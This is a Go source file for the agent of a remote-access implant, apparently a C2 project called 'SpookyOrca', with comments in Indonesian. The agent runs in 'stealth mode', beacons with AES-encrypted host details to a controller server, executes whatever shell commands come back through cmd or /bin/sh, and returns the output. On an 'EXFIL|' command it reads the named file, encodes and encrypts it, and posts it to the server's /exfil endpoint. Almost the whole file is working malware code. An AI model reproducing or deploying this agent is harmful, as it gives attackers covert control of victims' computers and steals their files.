package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/google/uuid"
)

var agentID = uuid.New().String()

func startAgent() {
	fmt.Println("[+] Agent started in stealth mode")
	hostname, _ := os.Hostname()
	serverURL := "http://127.0.0.1:8080"
	encryptionKey := "SpookyOrcaC2AES1"

	for {
		// Kirim ping ke server
		info := fmt.Sprintf("%s|%s", hostname, agentID)
		encryptedInfo, _ := encryptAES(info, encryptionKey)
		encodedInfo := url.QueryEscape(encryptedInfo)
		resp, err := http.Get(fmt.Sprintf("%s/ping?info=%s", serverURL, encodedInfo))

		if err != nil || (resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusNoContent) {
			time.Sleep(3 * time.Second)
			continue
		}

		commandBytes, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			continue
		}

		command, err := decryptAES(string(commandBytes), encryptionKey)
		if err == nil && command != "" {
			if len(command) > 6 && command[:6] == "EXFIL|" {
				filepath := command[6:]
				exfiltrateFile(filepath, serverURL, encryptionKey)
			} else {
				out, err := executeCommand(command)
				if err != nil {
					out = fmt.Sprintf("Error: %s", err.Error())
				}
				encryptedResult, _ := encryptAES(out, encryptionKey)

				// ✅ Perbaikan: Menambahkan `type=cmd` dalam request
				http.Post(fmt.Sprintf("%s/result?id=%s&type=cmd", serverURL, agentID), "text/plain", bytes.NewBufferString(encryptedResult))
			}
		}
		time.Sleep(3 * time.Second)
	}
}

func executeCommand(cmd string) (string, error) {
	if runtime.GOOS == "windows" {
		out, err := exec.Command("cmd", "/C", cmd).Output()
		return string(out), err
	} else {
		out, err := exec.Command("/bin/sh", "-c", cmd).Output()
		return string(out), err
	}
}

func exfiltrateFile(filepath, serverURL, encryptionKey string) {
	fileData, err := os.ReadFile(filepath)
	if err != nil {
		fmt.Println("[-] Error reading file:", err)
		return
	}

	encodedData := base64.StdEncoding.EncodeToString(fileData)
	encryptedData, _ := encryptAES(encodedData, encryptionKey)

	// Kirim file dengan nama file sebagai parameter di URL
	resp, err := http.Post(fmt.Sprintf("%s/exfil?id=%s&filename=%s", serverURL, agentID, url.QueryEscape(filepath)), "text/plain", bytes.NewBufferString(encryptedData))
	if err != nil {
		fmt.Println("[-] Failed to exfiltrate file:", err)
		return
	}
	resp.Body.Close()
	fmt.Println("[+] File exfiltrated:", filepath)
}
